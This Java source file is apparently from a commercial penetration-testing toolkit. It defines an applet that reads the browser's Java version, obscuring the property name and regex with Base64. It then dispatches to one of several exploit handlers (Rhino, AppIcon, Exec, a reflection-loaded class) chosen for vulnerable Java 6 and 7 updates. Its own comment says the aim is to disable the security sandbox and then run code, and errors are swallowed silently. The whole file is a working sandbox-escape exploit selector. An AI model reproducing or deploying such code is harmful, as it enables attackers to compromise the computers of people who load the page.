/*
 * (c) 2012 Strategic Cyber LLC
 *
 * Smart Applet Decision Tree...
 *
 * See http://www.advancedpentest.com/license
 */
import java.applet.*;

import java.io.*;
import java.awt.*;

import java.util.regex.*;
import java.lang.reflect.*;

public class JavaApplet extends Applet {
	public void init() {
		try {
			Main    handler = null;
			String  version = System.getProperty(new String(Base64.decode("amF2YS52ZXJzaW9u"), "UTF-8"));
			Pattern parser  = Pattern.compile(new String(Base64.decode("MS4oXGQrKS4wXyhcZCsp"), "UTF-8"));
			Matcher m       = parser.matcher(version);
			if (m.matches()) {
				String major = m.group(1);
				int minor = Integer.parseInt(m.group(2));

				/* 1.6.0 <= update 27 */
				if ("6".equals(major) && minor <= 27) {
					handler = new Rhino(this);
				}
				/* 1.6.0 <= update 45 */
				else if ("6".equals(major) && minor <= 45) {
					handler = new AppIcon(this);
				}
				/* 1.7.0 <= update 0 */
				else if ("7".equals(major) && minor == 0) {
					handler = new Rhino(this);
				}
				/* 1.7.0 <= update 6 */
				else if ("7".equals(major) && minor <= 6) {
					handler = new Exec(this);
				}
				/* 1.7.0 <= update 10 */
				else if ("7".equals(major) && minor <= 21) {
					/* this exploit relies on Java 1.7 specific stuff, so we load it using
					   Java's reflection API */
					Class clazz = Class.forName(new String(Base64.decode("QmVhbg=="), "UTF-8"), false, this.getClass().getClassLoader());
					Constructor cons = clazz.getConstructor(Applet.class);
					handler = (Main)cons.newInstance(this);
				}
			}
			else {
				/* 1.7.0 <= update 0 */
				if ("1.7.0".equals(version)) {
					handler = new Rhino(this);
				}
			}

			/* we found the appropriate handler, let's try to disable the security sandbox and then do stuff */
			if (handler != null) {
				handler.check();
			}
		}
		catch (Exception ex) {
		}
	}
}
